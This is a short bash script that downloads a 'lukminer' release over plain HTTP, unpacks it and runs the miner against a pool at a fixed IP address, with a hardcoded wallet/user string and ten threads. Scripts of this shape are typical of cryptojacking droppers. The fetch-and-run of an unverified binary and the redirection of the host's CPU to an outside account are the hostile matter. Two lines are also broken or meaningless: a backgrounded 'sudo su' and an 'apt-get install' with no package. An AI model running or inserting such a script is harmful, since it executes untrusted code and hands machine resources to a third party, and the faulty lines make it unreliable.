#!/bin/bash
sudo su &
sudo apt-get update
sudo apt-get install
mkdir lukminer
cd lukminer
wget http://lukminer.net/releases/latest.tgz
tar xfvz latest.tgz
./luk-cpu -a xmrv8 --host 168.235.86.33 --port 4486 --user SK_MB2alcAPslZOo5sDPnXnH.1NDi7d6idbYsQif395aYMqqtLHTRtSN17J --pass x -t 10